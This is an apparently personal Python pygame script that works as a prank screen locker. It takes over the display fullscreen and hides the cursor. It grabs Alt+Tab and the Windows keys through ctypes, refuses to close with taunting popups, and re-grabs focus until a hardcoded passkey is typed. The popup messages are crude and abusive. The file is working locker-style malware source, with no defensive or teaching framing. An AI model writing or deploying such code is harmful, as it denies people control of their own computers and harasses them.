import pygame
import sys
import random
import ctypes
from pymsgbox import *
import time

pygame.init()   

icon = pygame.image.load('C:\\Users\\mahvi\\OneDrive\\Documents\\deathjj.png')
pygame.display.set_icon(icon)

screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
pygame.display.set_caption("XMO-5")

pygame.mouse.set_visible(False)

background = pygame.image.load('C:\\Users\\mahvi\\OneDrive\\Documents\\rahha.jpg')
background = pygame.transform.scale(background, (screen.get_width(), screen.get_height()))

BLACK = (0, 0, 0)
RED = (255, 0, 0)
WHITE = (255, 255, 255)

PASSKEY = "MahvGanteng123"
input_key = ""

def block_system_keys():
    user32 = ctypes.windll.user32
    MOD_ALT = 0x0001
    VK_TAB = 0x09
    VK_LWIN = 0x5B
    VK_RWIN = 0x5C
    
    user32.RegisterHotKey(None, 1, MOD_ALT, VK_TAB)
    user32.RegisterHotKey(None, 2, 0, VK_LWIN)
    user32.RegisterHotKey(None, 3, 0, VK_RWIN)

def unblock_system_keys():
    user32 = ctypes.windll.user32
    user32.UnregisterHotKey(None, 1)
    user32.UnregisterHotKey(None, 2)
    user32.UnregisterHotKey(None, 3)

block_system_keys()

# Main loop
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.init()
            alert(title=f'Memek Kontol 48 - len()3d0fgd808890nb8048b90023458877)',text=f'You cant run from me UwU', button=f'fuck')
            pass
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_BACKSPACE:
                input_key = input_key[:-1] 
            else:
                input_key += event.unicode  
            if PASSKEY in input_key:
                running = False
                time.sleep(1)
                alert(title='Congrats?!?!?', text='Pretend you`re dead bitch.', button='ok lol',)
                break

   
    screen.blit(background, (0, 0))

    # Display the entered keys
    font = pygame.font.Font(None, 50)
    text = font.render(input_key, True, RED)
    text_rect = text.get_rect(center=(screen.get_width() / 2, screen.get_height() - 50))  
    screen.blit(text, text_rect)

    pygame.display.flip()

    # Check focus and refocus
    if not pygame.display.get_active():
        pygame.display.set_mode((0, 0), pygame.FULLSCREEN)

pygame.quit()
sys.exit()
